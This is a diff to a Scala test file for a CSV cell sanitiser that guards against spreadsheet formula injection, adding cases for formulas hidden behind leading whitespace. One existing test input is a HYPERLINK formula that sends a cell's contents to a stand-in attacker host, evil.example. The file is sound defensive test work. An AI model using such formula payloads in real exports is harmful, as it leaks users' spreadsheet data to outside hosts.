@@ -14,6 +14,13 @@ class CsvCellSpec extends AnyFlatSpec with Matchers:
     CsvCell.text("\t=1+1") shouldBe "'\t=1+1"
   }
 
+  it should "neutralize formulas hidden behind leading whitespace" in {
+    CsvCell.text("  =HYPERLINK(1)") shouldBe "'  =HYPERLINK(1)"
+    CsvCell.text(" @SUM(A1)") shouldBe "' @SUM(A1)"
+    CsvCell.text("\u00a0+1") shouldBe "'\u00a0+1"
+    CsvCell.text("  plain") shouldBe "  plain"
+  }
+
   it should "quote neutralized values that also need RFC 4180 escaping" in {
     CsvCell.text("=HYPERLINK(\"http://evil.example/?d=\"&A1,\"x\")") shouldBe
       "\"'=HYPERLINK(\"\"http://evil.example/?d=\"\"&A1,\"\"x\"\")\""
